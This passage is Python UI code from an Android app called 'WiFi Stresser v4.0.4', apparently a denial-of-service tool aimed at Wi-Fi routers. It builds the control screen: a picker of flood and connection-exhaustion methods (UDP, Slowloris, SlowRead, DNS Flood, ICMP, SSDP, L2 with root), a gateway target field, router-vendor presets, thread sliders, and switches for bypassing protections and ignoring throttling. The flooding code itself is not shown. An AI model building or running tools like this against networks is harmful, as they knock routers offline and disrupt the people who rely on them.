            ui.button(self.L("btn_priv"), on_click=lambda: self._refresh_privileges_async(silent=False), style="outlined"),
        ]
        if self._shizuku_service and not is_shizuku:
            priv_row.append(ui.button(self.L("btn_grant"), on_click=self._request_shizuku_permission, style="filled"))
        mode_cards = [
            ui.text(self.L("mode_lbl"), "titleMedium"),
            ui.row([self._method_chip(ui, "UDP", True), self._method_chip(ui, "CONNECT", True), self._method_chip(ui, "HTTP", True)], spacing=6, fill_max_width=True),
            ui.row([self._method_chip(ui, "Hold", True), self._method_chip(ui, "Slowloris", True), self._method_chip(ui, "SlowBody", True)], spacing=6, fill_max_width=True),
            ui.row([self._method_chip(ui, "SlowRead", True), self._method_chip(ui, "UPnP XML", True), self._method_chip(ui, "SSDP", True)], spacing=6, fill_max_width=True),
            ui.row([self._method_chip(ui, "DNS Flood", True), self._method_chip(ui, "ICMP", icmp_available), self._method_chip(ui, "Mixed", True)], spacing=6, fill_max_width=True),
            ui.row([self._method_chip(ui, "L2 (Root)", l2_available)], spacing=6, fill_max_width=True)
        ]
        if self.method == "Mixed":
            mode_cards.append(ui.button(self.L("btn_mix_cfg"), on_click=self._open_mixed_settings, style="outlined", fill_max_width=True))
        time_progress = 0.0
        if self.running and self.duration > 0:
            time_progress = max(0.0, min(1.0, (self.duration - self.time_left) / float(self.duration)))
        if self.running:
            timer_text = self.L("timer_inf_run") if self.duration == 0 else self.L("timer_left", t=self.time_left, d=self.duration)
        else:
            dur_disp = "∞" if self.duration == 0 else f"{self.duration}s"
            timer_text = self.L("dur_lbl", d=dur_disp)
        net_icon = "📶" if is_wifi else "🌐"
        active_socks = len(self.sockets) if self.running else 0
        if self.method == "Mixed":
            stats_speed_text = f"⚡ {self.pps}{self.L('pps_unit')} · 🪝 {active_socks}{self.L('socks_unit')}"
        elif self.method in ["Hold", "Slowloris", "SlowBody", "SlowRead"]:
            stats_speed_text = self.L("socks_lbl", n=active_socks)
        else:
            stats_speed_text = f"⚡ {self.pps}{self.L('pps_unit')}"
            
        max_udp, max_tcp = self._get_max_limits()
        slider_components = []
        is_mixed = (self.method == "Mixed")
        is_tcp = (self.method in ["CONNECT", "HTTP", "Hold", "Slowloris", "SlowBody", "SlowRead"])
        is_udp = (self.method in ["UDP", "UPnP XML", "SSDP", "DNS Flood", "ICMP", "L2 (Root)"])
        if is_mixed or is_udp:
            slider_components.append(ui.slider(value=float(self.udp_threads), on_change=lambda v: self._set_udp_threads(int(v)),
                                               minimum=16, maximum=max_udp, title=self.L("sl_udp", n=self.udp_threads), steps=max(1, max_udp - 16)))
        if is_mixed or is_tcp:
            slider_components.append(ui.slider(value=float(self.tcp_threads), on_change=lambda v: self._set_tcp_threads(int(v)),
                                               minimum=4, maximum=max_tcp, title=self.L("sl_tcp", n=self.tcp_threads), steps=max(1, max_tcp - 4)))
        pps_graph_text = ""
        if self.pps_history:
            max_pps = max(self.pps_history) or 1
            for p in self.pps_history[-10:]:
                level = int((p / max(max_pps, 1)) * 8)
                pps_graph_text += "▓" * level + "░" * (8 - level) + " "
        history_components = []
        if self.session_history:
            items = []
            for sess in self.session_history[:3]:
                items.append(ui.text(f"{sess.get('timestamp', '')[:10]} · {sess.get('vendor', '?')} · {sess.get('total_packets', 0)}{self.L('pkts_unit')}", "bodySmall"))
            history_components.append(ui.card([
                ui.text(self.L("hist_lbl"), "titleSmall"), *items,
                ui.button(self.L("hist_all"), on_click=lambda: self.navigate("history"), style="text")
            ]))
        children = [
            ui.card([ui.column([
                ui.row([ui.chip("RU", selected=(self.lang == "ru"), on_click=lambda: self._set_lang("ru")),
                        ui.chip("EN", selected=(self.lang == "en"), on_click=lambda: self._set_lang("en"))], spacing=6),
                ui.text(f"{net_icon} {ssid}", "titleMedium"), ui.text(f"IP: {ip}", "bodyMedium"),
                ui.row([ui.text(f"Shizuku: {'✅' if is_shizuku else '❌'}", "bodySmall"),
                        ui.text(f" · Root: {'✅' if is_root else '❌'}", "bodySmall")], spacing=6),
                ui.text(self.L("vendor_lbl", v=self._vendor_display()), "bodySmall"),
            ], spacing=4)]),
            ui.card([
                ui.text(self.L("presets_lbl"), "titleSmall"),
                ui.row([ui.chip("TP-Link", selected=(self.active_preset == "Standard"), on_click=lambda: self._apply_preset("Standard")),
                        ui.chip("Keenetic WPA3 🛡️", selected=(self.active_preset == "Keenetic"), on_click=lambda: self._apply_preset("Keenetic"))], spacing=6, fill_max_width=True),
                ui.row([ui.chip(self.L("preset_radio"), selected=(self.active_preset == "Radio"), on_click=lambda: self._apply_preset("Radio")),
                        ui.chip("Max Stress 🔥", selected=(self.active_preset == "MaxStress"), on_click=lambda: self._apply_preset("MaxStress"))], spacing=6, fill_max_width=True)
            ]),
            ui.card([
                ui.row([ui.text(self.L("diag_lbl"), "titleSmall"), ui.button(self.L("guide_btn"), on_click=lambda: self.navigate("guide"), style="text")], fill_max_width=True),
                ui.row(diag_buttons, spacing=6), ui.row(priv_row, spacing=6, fill_max_width=True),
                ui.text(self._ping_display(), "bodySmall")
            ]),
            ui.card(mode_cards),
            ui.card([
                ui.text(self.L("params_lbl"), "titleMedium"),
                ui.text_field(value=self.gateway, on_change=lambda v: self._set_gateway(v), label=self.L("lbl_gw"), single_line=True, fill_max_width=True),
                ui.row([
                    ui.text_field(value=str(self.port), on_change=lambda v: self._set_port(v), label=self.L("lbl_port"), single_line=True, fill_max_width=True),
                    ui.text_field(value=str(self.duration), on_change=lambda v: self._set_duration(v), label=self.L("lbl_dur"), single_line=True, fill_max_width=True)
                ], spacing=8, fill_max_width=True),
                ui.text(self.L("quick_lbl"), "bodySmall"),
                ui.row([self._duration_chip(ui, 15, self.L("d_15")), self._duration_chip(ui, 30, self.L("d_30")), self._duration_chip(ui, 60, self.L("d_60"))], spacing=6, fill_max_width=True),
                ui.row([self._duration_chip(ui, 120, self.L("d_120")), self._duration_chip(ui, 300, self.L("d_300")), self._duration_chip(ui, 0, self.L("d_inf"))], spacing=6, fill_max_width=True),
                *slider_components,
                ui.switch(checked=self.bypass_mode, on_change=lambda v: self._set_bypass_mode(v), title=self.L("sw_bypass"), subtitle=self.L("sw_bypass_sub")),
                ui.switch(checked=self.throttle_ignore, on_change=lambda v: self._set_throttle(v), title=self.L("sw_thr"), subtitle=self.L("sw_thr_sub")),
                ui.switch(checked=self.high_limit_mode, on_change=lambda v: self._set_high_limit(v), title=self.L("sw_lim"), subtitle=self.L("sw_lim_sub"))
            ]),
            ui.card([
                ui.button(self.L("btn_start") if not self.running else self.L("btn_stop"), on_click=self._toggle_stress,
                          style="filled" if not self.running else "error", fill_max_width=True)
            ]),
            ui.card([
                ui.row([ui.text(self.L("stat_lbl"), "titleSmall"), ui.text(stats_speed_text, "titleSmall")], fill_max_width=True),
                ui.text(f"HTTP {self.stats['http']} · CON {self.stats['connect']} · HOLD {self.stats['hold']} · UDP {self.stats['udp']} · UPnP {self.stats['upnp']} · SSDP {self.stats['ssdp']} · DNS {self.stats['dns']} · SRead {self.stats['slowread']} · ICMP {self.stats['icmp']} · L2 {self.stats['l2']}", "bodySmall"),
                ui.text(self.L("vit_lbl", s=self._vit_display()), "bodySmall"),
                ui.text(timer_text, "bodyMedium"),
                ui.wavy_progress(progress=time_progress if (self.running and self.duration > 0) else (1.0 if self.running else 0.0)),
                ui.text(self.L("active_lbl", m=self.method, n=sum(1 for t in self.threads if t.is_alive())) if self.running else self.L("idle_lbl"), "bodySmall"),
            ]),
            ui.card([ui.text(self.L("graph_lbl"), "titleSmall"), ui.text(pps_graph_text if pps_graph_text else self.L("graph_none"), "bodySmall")]),
            *history_components,
            ui.card([
                ui.row([ui.text(self.L("log_lbl"), "titleSmall"), ui.button(self.L("btn_export"), on_click=self._export_audit_report, style="text"), ui.button(self.L("btn_clear"), on_click=self._clear_logs, style="text")], fill_max_width=True),
                ui.log_panel(log_content, max_height=180)
            ]),
            ui.card([ui.button(self.L("btn_kill"), on_click=self._open_rickroll, style="filled", fill_max_width=True)]),
            ui.card([ui.text(self.L("disclaimer"), "bodySmall")])
        ]
        return ui.scaffold(title="WiFi Stresser v4.0.4", actions=[ui.top_action("help", lambda: self.navigate("guide"))], content=ui.column(children, padding=16, spacing=12))

    def _method_chip(self, ui, method, available):
        return ui.chip(method, selected=(self.method == method), on_click=lambda: self._set_method(method) if available else None)

    def _duration_chip(self, ui, duration_val, label):
        return ui.chip(label, selected=(self.duration == duration_val), on_click=lambda: self._set_duration(duration_val))

    def screen_guide(self, ui, api, state):
        children = [
            ui.card([ui.text(self.L("g_intro_t"), "titleMedium"), ui.text(self.L("g_intro_b"), "bodySmall")]),
            ui.card([ui.text(self.L("g_prep_t"), "titleMedium"), ui.text(self.L("g_prep_b"), "bodySmall")]),
            ui.card([ui.text(self.L("g_att_t"), "titleMedium"), ui.text(self.L("g_att_b"), "bodySmall")]),
            ui.card([ui.text(self.L("g_byp_t"), "titleMedium"), ui.text(self.L("g_byp_b"), "bodySmall")]),
            ui.card([ui.text(self.L("g_proto_t"), "titleMedium"), ui.text(self.L("g_proto_b"), "bodySmall")]),
            ui.card([ui.text(self.L("g_met_t"), "titleMedium"), ui.text(self.L("g_met_b"), "bodySmall")]),
            ui.card([ui.text(self.L("g_faq_t"), "titleMedium"), ui.text(self.L("g_faq_b"), "bodySmall")]),
            ui.card([ui.button(self.L("g_back"), on_click=lambda: self.navigate("main"), style="filled", fill_max_width=True)])
